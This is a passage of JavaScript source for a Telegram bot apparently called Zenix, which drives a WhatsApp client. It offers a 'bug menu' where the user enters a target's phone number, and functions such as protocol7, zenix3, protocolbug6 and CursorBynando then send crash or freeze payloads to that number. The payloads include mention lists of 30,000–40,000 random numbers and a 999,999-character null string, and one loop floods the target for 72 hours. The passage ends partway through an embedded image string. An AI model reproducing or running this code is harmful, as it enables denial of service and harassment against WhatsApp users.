┃⊱ /delprem <ɪᴅ>
┗━━━━━━━━━━━━━━━❍
`;

  const mainKeyboard = [
    [{
      text: "🔚 𝙱𝙰𝙲𝙺 𝙼𝙴𝙽𝚄",
      callback_data: "main_menu"
    }]
  ];


  await ctx.replyWithVideo("https://files.catbox.moe/eeoht4.mp4", {
      caption: mainMenuMessage,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
});

// Helper konversi nomor ke JID WhatsApp
function toJid(num) {
  return num.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
}

// =========================
// LOGIC FUNCTION PER BUG
// =========================
const bugCommands = {
  xrip: async (ctx, target) => {
    await prosesrespone(target, ctx);
    try {
      for (let i = 0; i < 1; i++) {
        await CursorBynando(target);
        await isagicombofc(target);
        console.log(`[✓] Sent Bug XRIP ${i+1}/1 to ${target}`);
      }
      await donerespone(target, ctx);
    } catch (err) {
      console.error(`[!] Error in XRIP:`, err);
      await ctx.reply("❌ Terjadi error saat mengirim bug.");
    }
  },

  xhard: async (ctx, target) => {
    await ctx.reply(`💥 Mengirim XHARD ke ${target}...`);
    await prosesrespone(target, ctx);
    try {
      for (let i = 0; i < 1; i++) {
        await weeklyDelay(target);
        console.log(`[✓] Sent Bug XHARD ${i+1}/1 to ${target}`);
      }
      await donerespone(target, ctx);
    } catch (err) {
      console.error(`[!] Error in XHARD:`, err);
      await ctx.reply("❌ Terjadi error saat mengirim bug.");
    }
    // tambahkan logika XHARD kamu di sini
  },

  xkros: async (ctx, target) => {
    await ctx.reply(`💣 Mengirim XKROS ke ${target}...`);
    // tambahkan logika XKROS kamu di sini
  },

  xbul: async (ctx, target) => {
    await ctx.reply(`🚜 Mengirim XBUL ke ${target}...`);
    await prosesrespone(target, ctx);
    try {
      for (let i = 0; i < 5; i++) {
          await ViSiXFC(target);
        console.log(`[✓] Sent Bug XBUL ${i+1}/5 to ${target}`);
      }
      await donerespone(target, ctx);
    } catch (err) {
      console.error(`[!] Error in XBUL:`, err);
      await ctx.reply("❌ Terjadi error saat mengirim bug.");
    }
    // tambahkan logika XBUL kamu di sini
  },

  xui: async (ctx, target) => {
  await ctx.reply(`📴 Mengirim XUI ke ${target}...`);
    await prosesrespone(target, ctx);
    try {
      for (let i = 0; i < 5; i++) {
          await robustfreeze(target);
        console.log(`[✓] Sent Bug XUI ${i+1}/5 to ${target}`);
      }
      await donerespone(target, ctx);
    } catch (err) {
      console.error(`[!] Error in XUI:`, err);
      await ctx.reply("❌ Terjadi error saat mengirim bug.");
    }
    
    // tambahkan logika XUI kamu di sini
  },

  xstrom: async (ctx, target) => {
    await ctx.reply(`⚡ Mengirim XSTROM ke ${target}...`);
    await prosesrespone(target, ctx);
    try {
      for (let i = 0; i < 1; i++) {
          await zenix2(target);
        console.log(`[✓] Sent Bug XSTROME ${i+1}/1 to ${target}`);
      }
      await donerespone(target, ctx);
    } catch (err) {
      console.error(`[!] Error in XSTROME:`, err);
      await ctx.reply("❌ Terjadi error saat mengirim bug.");
    // tambahkan logika XSTROM kamu di sini
};
}
}
// =========================
// MENU BUG BUTTON
// =========================
bot.action('bugmenu', async (ctx) => {
  await ctx.deleteMessage();

  const mainMenuMessage = `
💥 *Z E N I X - B U G  M E N U* 💥
「 サイバー攻撃ユニット - モード：アクティブ 」

🧑‍💻 *ᴅᴇᴠᴇʟᴏᴘᴇʀ* : ${global.dev}
🤖 *名ʙᴏᴛ ɴᴀᴍᴇ* : ${BOT}
🧩 *ᴠᴇʀsɪᴏɴ* : ${ver}
─────────────────────
⚠️ _Gunakan fitur ini dengan bijak. Developer tidak bertanggung jawab atas penyalahgunaan._
─────────────────────
🎯 *𝐁 𝐔 𝐆-𝐌 𝐄 𝐍 𝐔*
─────────────────────
🎌 _ようこそ、Zenixの世界へ…_ 🚨
`;  const mainKeyboard = [
    [
      { text: "🧨 XHARD", callback_data: "xhard" },
      { text: "💣 XKROS", callback_data: "xkros" },
    ],
    [
      { text: "👻 XRIP", callback_data: "xrip" },
      { text: "🚜 XBUL", callback_data: "xbul" },
    ],
    [
      { text: "📴 XUI", callback_data: "xui" },
      { text: "⚡ XSTROM", callback_data: "xstrom" },
    ],
    [
      { text: "🔙 戻る (Main Menu)", callback_data: "main_menu" },
    ],
  ];
    
  await ctx.replyWithVideo("https://files.catbox.moe/eeoht4.mp4", {
    caption: mainMenuMessage,
    parse_mode: "Markdown",
    reply_markup: { inline_keyboard: mainKeyboard }
  });
});

// =========================
// HANDLE TOMBOL BUG DIPILIH
// =========================
// 🔘 Handler ketika tombol bug ditekan
Object.keys(bugCommands).forEach(bug => {
  bot.action(bug, async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.deleteMessage(); // 🔥 Hapus menu bug saat tombol diklik
    await ctx.reply(`☧ Masukan Nomor Target Awali Dari 628xxxx:`, { parse_mode: "Markdown" });
    usersState[ctx.from.id] = { waitingFor: bug };
  });
});

// 🔘 Handler ketika user balas nomor target
bot.on('text', async (ctx) => {
  const state = usersState[ctx.from.id];
  if (!state || !state.waitingFor) return;

  const promptMsgId = ctx.message.message_id; // ID pesan nomor
  const raw = ctx.message.text.trim();
  const target = toJid(raw);
  const bugType = state.waitingFor;

  delete usersState[ctx.from.id]; // bersihkan status

  // 🔥 Hapus pesan user (nomor target) agar rapi
  try {
    await ctx.deleteMessage(promptMsgId);
  } catch (e) {
    console.warn("⚠️ Gagal hapus pesan user:", e.message);
  }

  await ctx.reply(`🚀 Menyerang target *${raw}* dengan mode *${bugType.toUpperCase()}*...`, { parse_mode: "Markdown" });

  if (bugCommands[bugType]) {
    await bugCommands[bugType](ctx, target);
  } else {
    await ctx.reply("❌ Fungsi bug tidak ditemukan.");
  }
});

// Handler untuk callback "main_menu"
bot.action('main_menu', async (ctx) => {
  await ctx.deleteMessage();
  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const isOwnerStatus = isOwner(ctx.from.id);
 
  const mainMenuMessage = `
🌸 *Z E N I X - C O R E* 🌸
「 このスクリプトは正義と反撃のために設計された 」  
─────────────────────
🧑‍💻 *ᴅᴇᴠᴇʟᴏᴘᴇʀ* : ${global.dev}
📱 *ᴄᴏɴᴛᴀᴄᴛ ᴍᴇ* : ${owner}
📺 *ᴍʏ ᴄʜᴀɴɴᴇʟ* : ${ch}
🧩 *ᴠᴇʀsɪᴏɴ* : ${ver}
⏱ *ᴜᴘᴛɪᴍᴇ* : ${Math.floor(process.uptime())} 秒
─────────────────────
👑 *ᴏᴡɴᴇʀ* : ${isOwnerStatus ? '✅' : '❌'}
🛡️ *ᴀᴅᴍɪɴ* : ${isAdminStatus ? '✅' : '❌'}
💎 *ᴘʀᴇᴍɪᴜᴍ* : ${isPremium ? '✅' : '❌'}
─────────────────────
⚠️ _Script ini hanya untuk membuat ripper/penipu kena mental._
🛑 Jangan digunakan untuk balas dendam atau tindakan kriminal.

📖 *QS Asy-Syura (42):40*
> وَجَزَٰٓؤُا۟ سَيِّئَةٍۢ سَيِّئَةٌۭ مِّثْلُهَا ۖ فَمَنْ عَفَا وَأَصْلَحَ فَأَجْرُهُۥ عَلَى ٱللَّهِ ۚ

"Balasan kejahatan adalah kejahatan yang setimpal. Namun siapa yang memaafkan & memperbaiki, pahalanya dari Allah."
─────────────────────
🎌 _ようこそ、Zenixの世界へ…_ 🚨
`;

  const mainKeyboard = [
    [{
      text: "🛠️ 武器(Dev Menu)",
      callback_data: "developercmd"
    },
    {
      text: "💥 バグ(Bug Menu)",
      callback_data: "bugmenu"
    },
    {
      text: "🤝 支援者(Supporters)",
      callback_data: "tqto"
    },
    {
      text: "📂 ノート(ɴᴏᴛᴇ)",
      callback_data: "note"
    }],
    [{
      text: "📡 HQチャンネルをフォローする",
      url: "https://whatsapp.com/channel/0029VbAk1E0DDmFRUcfGbk1i"
    }]
  ];

  // Kirim video dan audio dengan delay agar smooth
  setTimeout(async () => {
    await ctx.replyWithVideo("https://files.catbox.moe/eeoht4.mp4", {
      caption: mainMenuMessage,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });

    await ctx.replyWithAudio("https://files.catbox.moe/ba2kaa.mp3", {
      title: "起動音 - Boot Sound",
      performer: "ZENIX SYSTEM"
    });
  }, 1000);
});

//FUNC DELAY NYA WAK
async function protocol7(target, mention) {

  const floods = 40000;

  const mentioning = "13135550002@s.whatsapp.net";

  const mentionedJids = [

    mentioning,

    ...Array.from({ length: floods }, () =>

      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`

    )

  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";

  const mime = "audio/mpeg";

  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";

  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";

  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";

  const timestamp = 99999999999999;

  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";

  const longs = 99999999999999;

  const loaded = 99999999999999;

  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {

    mentionedJid: mentionedJids,

    isForwarded: true,

    forwardedNewsletterMessageInfo: {

      newsletterJid: "120363321780343299@newsletter",

      serverMessageId: 1,

      newsletterName: "𝘎𝘰𝘻𝘶𝘫𝘪 𝘐𝘴 𝘏𝘦𝘳𝘦"

    }

  };

  const messageContent = {

    ephemeralMessage: {

      message: {

        audioMessage: {

          url: links,

          mimetype: mime,

          fileSha256: sha,

          fileLength: longs,

          seconds: loaded,

          ptt: true,

          mediaKey: key,

          fileEncSha256: enc,

          directPath: path,

          mediaKeyTimestamp: timestamp,

          contextInfo: messageContext,

          waveform: data

        }

      }

    }

  };

  const msg = generateWAMessageFromContent(target, messageContent, { userJid: target });

  const broadcastSend = {

    messageId: msg.key.id,

    statusJidList: [target],

    additionalNodes: [

      {

        tag: "meta",

        attrs: {},

        content: [

          {

            tag: "mentioned_users",

            attrs: {},

            content: [

              { tag: "to", attrs: { jid: target }, content: undefined }

            ]

          }

        ]

      }

    ]

  };

  await rofik.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {

    await rofik.relayMessage(target, {

      groupStatusMentionMessage: {

        message: {

          protocolMessage: {

            key: msg.key,

            type: 25

          }

        }

      }

    }, {

      additionalNodes: [{

        tag: "meta",

        attrs: {

          is_status_mention: " null - exexute "

        },

        content: undefined

      }]

    });

  }

}


// combo
async function zenix2(target, durationHours = 72) {

  const totalDurationMs = durationHours * 60 * 60 * 1000;

  const startTime = Date.now();

  let count = 0;

  while (Date.now() - startTime < totalDurationMs) {

    try {

      if (count < 5) {

        // Panggilan ke fungsi pengirim pesan

        await zenix3(target, true);

        console.log(chalk.yellow(`Proses kirim bug sampai ${count + 1}/50 target> ${target}`));

        count++;

      } else {

        console.log(chalk.green(`[✓] Success Send Bug Zenix Combo${target}`));

        count = 0;

        console.log(chalk.red("➡️ Next 1000 Messages"));

      }

      // Delay 100ms antar pengiriman

      await new Promise(resolve => setTimeout(resolve, 100));

    } catch (error) {

      console.error(`❌ Error saat mengirim: ${error.message}`);

      await new Promise(resolve => setTimeout(resolve, 100));

    }

  }

  console.log(`Stopped after running for 3 days. Total messages sent in last batch: ${count}`);

}
async function zenix3(target, mention) {
 console.log(chalk.green("Sucses Send Bug Zenix"));
  const generateMessage = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "🚀 ZENIX FOR YOU 🚀",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath:
            "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, generateMessage, {});

  await rofik.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await rofik.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "potter is back" },
            content: undefined,
          },
        ],
      }
    );
  }
}


// protocol6
async function protocolbug6(target, mention) {
  let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "VALORES ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "TREDICT INVICTUS", // GAUSAH GANTI KOCAK ERROR NYALAHIN GUA
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            forwardedNewsletterMessageInfo: {
              newsletterName: "trigger newsletter ( @tamainfinity )",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await rofik.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await rofik.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" },
              content: undefined
            }
          ]
        }
      }
    }, {});
  }
}

// info
bot.command("info", async (ctx) => {
  let user;

  // Cek apakah command ini reply ke pesan orang
  if (ctx.message.reply_to_message) {
    user = ctx.message.reply_to_message.from;
  } else {
    user = ctx.from;
  }

  const nama = `${user.first_name || ''} ${user.last_name || ''}`.trim();
  const username = user.username ? `@${user.username}` : "❌ Tidak ada";
  const id = user.id;

  const infoText = `
╭──「 𝗜𝗡𝗙𝗢 𝗨𝗦𝗘𝗥 」──⬣
│ 🧍 Nama: ${nama}
│ 🆔 ID: \`${id}\`
│ 🔗 Username: ${username}
╰─────────────────────⬣`;

  await ctx.replyWithMarkdown(infoText);
});

// fc
async function CursorBynando(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: 'Nando Is Here Ahaha' 
          },
          footer: { 
            text: 'Nando Is Here Ahaha' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: 'haha fc boss',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQEASABIAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABAMDBAMDBAQDBAUEBAUGCgcGBgYGDQkKCAoPDRAQDw0PDhETGBQREhcSDg8VHBUXGRkbGxsQFB0fHRofGBobGv/bAEMBBAUFBgUGDAcHDBoRDxEaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGv/AABEIASwBLAMBIgACEQEDEQH/xAAcAAAABwEBAAAAAAAAAAAAAAABAgMEBQYHAAj/xABFEAABAwIDBQQGBwYFBAMBAAACAAEDBBIFESIGITJCUhMxQWIUUWFxcoIHFSOSorLCJDOBkdLwQ6HB4eI0c7HRFkRTY//EABsBAAIDAQEBAAAAAAAAAAAAAAACAwQFBgEH/8QALBEAAgICAQQBBAICAgMAAAAAAAIBAwQSERMhIjEFFDJBQlJiBlEjMyRhgv/aAAwDAQACEQMRAD8Aww6KHlF/4Emx4cGQ2l/MVJhp4V2SXgUhTw0s9L3exInRSBptdT5CJeCJYOVvD8KBSvdlKLuNrotvFptVheK9n7i+VIlSgXJ/IkDEFagcbWUqdAI8OY+8U3Og36X/ABIAY8KMlnopBbxSfZHlpFyQKJ2oGHcSMwuPELiuDUgDuJkVkZ9Tal3ggAUTzI3giOXSgDn7/b60VzZckJzAAOWcmEB3k5EgBViufvSbyhE3fcq3UYjPXuUVFEFJD3lPKOq34VE1g7+wp556qbvLXpD3puALhLjtHBf2tS5GPKAXZJl/83pAzYQMxHh02qgmTk5X6i7s+pE381yOBjTINqKWsZ/R5oRO3SB3C6bPiIDeVUJk5cI3WqgQaTLS3DmnD1E5RNGRuQepGgpc8LxYjYgE9YkTCV3KrhsxKMuIM4FcRRZ53LFmleB7hJ4/hVk2b2oPC6i8RcrR1M5aUsoMa1Od0pFvt8yKHeSi6PFocRpGnNwC4urhTylqop2FxNtW627iSgOme1Ha7+CRutcebwySwD60AGZcyFc/CgDhR7bmRBRxzyK1AHD3kjsKBka4hbJAAW/lQW+5KMifz+6gAGHdnch8NOlcuUwoR7s0D6mdKXIHSjCSK/8AklEUkoBOq5F8Eo6C1NACdrerUiPEPrJKMKNbayUUbPTtkW5tSbnQMXh/JP7eJCgCKOit4RtSR0pjyqYt4rkVwHlFAQQZxGHKksi9Sn3iYuZy96bnTh3ELfKlGIQitu3qs4xWhUVDQm/7NDvMeG4vapraDEYqBiCAm7Yt3F3eZUkczMjPMnuztuUyJseTOpI0lPPXgcsp+jUhFnfzSeVvYlquqo6KnOngDcQ8o/qUPLVGIZE72io+Q7me4uJPqIEcQHzILukGRdK59Lal6MHArX0iw/Kle19ybGV27JdduS8gLmQFx5JMyICcYunJBdcyKBcxd6AHjV5hB2QvaQ8TogYlVhvCokDw3Fak2IC4R3o9wc3Cl4AuGCbfHSRBFigPU26Slbj/AN1ecLx6ixcWOknA7uW7UPyrETC5hsJDGctPK0sBvGY8LjpdkvA0G/sV3ruSiq+y20L4vQRekZdsG4yYtV3UrMPClAOHl70dhRAR7beHuSgGYULC65uFKMNqYArjuQNn5Ua3cu+8gAttyC3iRm1N7VzjcpBQnszRbUpbvQPwoATyQWpQVzilGE7eK1FR3tRXQARc2lGt8FzD7UAEt3IzWobUW0ckABzEisO/2JQBHVvRbn5e9AAONvvVZ2h2lp8JAgiIJ6wuGMS3B5nSG1u1YYSBUtK7S17j/CIfb/SsveU55HOUnMiLMnLvclIibexR/LUS1BnNUSEZmWZO6Dt2FtWn/VMgK58yLQKBiczzVqdRONhaeXdpFNrr2Rz7nHidHALGuJt6hGiBu+lB8SWYO0MrkZoHJ9Oq4kp6N/Z1LmZhd+ZOXDkHl505osJmqn0Du5it7l5qKMooHJ/anUeGSzvlEL5czq24RsqdQbRwB2h82fC3mf8ApWl4P9HIRUz1NZmICPfwl/xUkVsx5LqYiGzlVYRWPGI8V3KmMtKcTPeNt25bttLQQ4cA00ELBLLa0QPyF1P8qyXHezKYxiZ+zhGwLubzfMlmNRonYrd1vyozGlnp7mMyG1NnFkup6WDZPFPq7EY/s3lGXdY3F/Ba5QVUdbTBNT52GPN3isIpKh6ecJg0uBZith2PqBqsDilv1FKZkPMNxJJgYsLeZKCiNnvFHbiUYoLCOpHEbuJA3wo7d2SBjvDNEIjz4nSqJl7BTAcyBGYeVd4EmFCotu4tSNbvXWjkgIC2pO3pSrcyL4pRglq5Gy5cka1ACVvSS63cS57UP8UChGErXXfiR27+9A5FvQMEt3PqdV3azaAMDw/7InOqm3RNd94vhVjMgACOUxjABzJ37hFYdtLjx45ic1RycMTd2QeCaAImeeSeQ5ZzeSUyzJy7yQMW7LmJJWo/KSliRQSO58h4RTiMbY9PF1JKKIc9/KnscW5NEAEiBs7i1dIoTtzf1JzIHooZF+9L8KTjpzN7iH+aNRToYnlcW8Oa1PWp7QGMOL19KBomC0R1GXKKncKwGoryGKAXKQuEG8PM6lSvYSX1FMG2ZCoseo0gXCTju+7zLS9n9gJa8GYI2gpxL/F0/M//AKUPR7F4xhMfpdAckpcxAf3mtV22T289CnGhx4AsAdJMNjj5dSvV0qvtSm7s3pi87N7B0OHRDfD27jvESG1ruq1KbSFFh0cNwAUxETRQ/D5fUPMSc1G19BT0nb0FRHVAQ5jkX6eJZ7juM1M7TVNUzRGQ5EZjqceUWHluVl0VV7EabfkpG09aEXpNXVH29TKPZxdRe3++nzLM6kHnq7CzJ4uJuoy4VYsXq3qqgqgicuSBrvxfF/USPhWDCcpDUD2dPS/aVR8Orp/SsqU2bsXt9SvSYbYEcZM+rq6VWa0hKc7B03LQdoMwiOQwsM9ABbll/YrPpPtXd+FQPGpIk7CDDu6la9h8Z9Ar+wlO2Cf8JKpMW61OKY+yqAICe4elRDm/xkeXU/dcnAEPNpUXgNY2JYXSVPOYDeXnHSSlQLqUYwo3dkjMQ5IjcSMHcJcqAD5pK5HHvdEIiz7nQAZuFdd0oyJw5phQVyLch8EDAdSI5dKNw5oLUAFXEjWrkAE8UFqN8y7xJAsBbVyMioGKv9IFeVFs3UiD6qghh+Xm/KsXASJ9K036UZy9GoIc21GZ5etV7CdnCKk7acNxjcOXgnUCtxw5XFlu8yMwN0qSr4gg/wDA+ZR7adKaI2PPQaMLU7CXsAvLj5R6U3F2yfuyFOsOiF/tpeEeHPq6lPxqRx5Dumot4zVA3THvFi5U7ipZaqT0XDg7WQt5l/fKnWF0FXjdaNNQRnPOe60OUfi/Ut92N+i2HDqAhPI6ot5mI6X6VZooa3uR2Pqp5/pKeHCKuzEXYT61tGxdFTVEQvREAxFvJ4i1kkdsPo7CtnIK37CUtwnbuJZxU4ZtV9HNY1VQActGJcTDeBD/AEp9HqbnUTVWU9UUWExlT/ZGEYCOVziN38VRts9kKKeApqUv2lizvIRALf1KtbN/S3Hj0YDIR0dTblYWoXL2F6l20e3R0cBX00h+BGWq4vYtKLk07mdMPuVyTEqnZ6raWOaSyLcIlpv/AKRUXju1v1sF5jcZbyYi4vKqzjG1VTi8pvFTNddle57m/v1JLBsJmrZgI+1HMtU0lORM3uH/ANqjFzP4QXNNV5kmsMi9InCUZW9J5Hfui83mf+xVsjw0MNoBOoHsoh1iJlvc+s/6eVdRy4VgMVtHTz1lVzSmFuRdWrUqvj+0ctRKYkbSTFusArhBSyiovH5KySztz+CvbU1/pU7iBOcQ7h6rep/MSrLxWxv6yVgjoinzf954k9ulkxq6W28LdIcSyrEbY0UdSvONrpSMdxIZBIXLSuizyNVtSc1H6OK1yoJKYy3XZj7FeQL2fxWXfR2ZjUTgQ6NOrzLUGK5JwAoyOxbvKkgFH5dSUAzfeXXLhXXN1OgYFyQcqLch8FJwKBajOK7lRUowLIvEhbxuXIADxz3IpozojkiAO8CQ+CBC6BQOJkW3qFG5kBlu08RIGM4+kgO1rMNC7huuL1XF/wAU4irGpcKekON7iIgEwHdb3XeXhXbc0Z1FJ6fEN3o8o7vKP9/iUViuKShgzBAd1LLYZMPXa9v53+8m42CJ1K5iE/pVW4jwAmV10mni8qG62IiItRb0NIG9yLhEVPWLILiROMQcpfzJTuEYTU4tUx0eHBd1P4N5k1wfDZa+cQibURZXdK33YjZWHCacAEG7Q7bzV2mjqt/6IpfUsf0cbC0mz9EBWMUkvGfMfv8A6VsWH0ARQDp1FzKr4MO8BstsV6w7WAiuipp8eIKs3Kvsi8QwGmxKnOCqiaQC6lR6/wCj7EKIDiw6UK6jL/Aqf9CWuPS3M9vMiHREPi6foFG6/b0eaNofoqavjfsKabCpguMcivASTbAPo8xetwyal2hhMWAibtB5x5SYuJelqunGy4mAvMSh6on7N4iJhD2Kq9NStzJBDuy8HnHG/olxOLsn2VpqYhDcQyE+kvYSzfFcc2p2cnOhr4PQZLsiY4H3r27QRQhEZFZk3h61iX0i0AY3UvLh0FkolqMbkt2Mum6eMiJk6Po/kedJKvG8X1T+lSj8HZj95DT0Y05/t5sHiQD/AKkrnV4DVRObVtb2XtcyIvujw/MSquKUFFTXuVa8sollaI8XzLK0ZO7mnFm/oevUBK1mHDcA8/CLf395RmJlHFH2MRcXG6jY6ianlt1x3cIetM62vMpDC3WO73JHddSVEbYbVWV7/iR4huHLp4k2u+Z07jG0CG3USpcbFznUt+wgENSdvMf6f+S00NTOs+2LgPtqguJgPlHyrQQ8BVefuHgOKUSaFuFKMHu3ILm9i5itZEJ96OAOAtPEjsiASVZSCnMW513ggQMlGBYVy5BvQBzjvROVH8UT3JQORm03IvUhZAp2lIylbHIY8IiSVctxJtUlbGIoAY1NKB4fNFPkQlFkVyyXHKP6uqHhpzMqYyJwAvBaris7tFbw3W3D5Vme0E7VmJjEHdFuLLxIiTxAELMNtoIY9ER3e5LSxdrVva+67L5RRqIBlqKccr7jzt6tSnSPIRzTfo8wNv3xs+jd83itow6AcgL1Km7J0foeHwxXMT8z+suZXugDcwjw9K6GmNVKcyWrBybMbndXWjIIgG3PMd6pOHDZk+attAYWd61aJ1MvI2YnoJbm1E1qb4hjUGHQOc72jd3etEawonIelYztBj00GN1h4ibjDEWi/hGJT339FNyjRj9Z+JYvtXtlFL+4jcWLqUfHiT1B+KyeP6UsDq6kaWnq5BMiyEpKc4mculnJlrOxU+GV9Eb1VR2UxcOYrFSxsp+INuxKsVOQuI170tPKAFvPdaqntNT15YUEeFTRUMxhcU0kV/4Vb8dooir6aGle/UT3XXZp7V4cFZRNDKzaQyFavT8eJMGXV35g8ozlVYtX/VuOYj9WVNxAcnZMQSj62Rx+jOGKb/riqW5pXK1v4ZNn/mr3t1sYFSxx1sZjb+4qYx3gSzekr9pMLp56erynpafinPcTD8SwLE1bzXY11dmXwbUS2twbCdmcHzpWYqq/K8+MyWXPcTGXr8VYNpsWqccmapq9MTB9kHqH1+91EzhbFC1r3Esq6xXft6NXHrZE8/uGAad/F4KZwqApZQcsyESFRQBzF8qs+CQ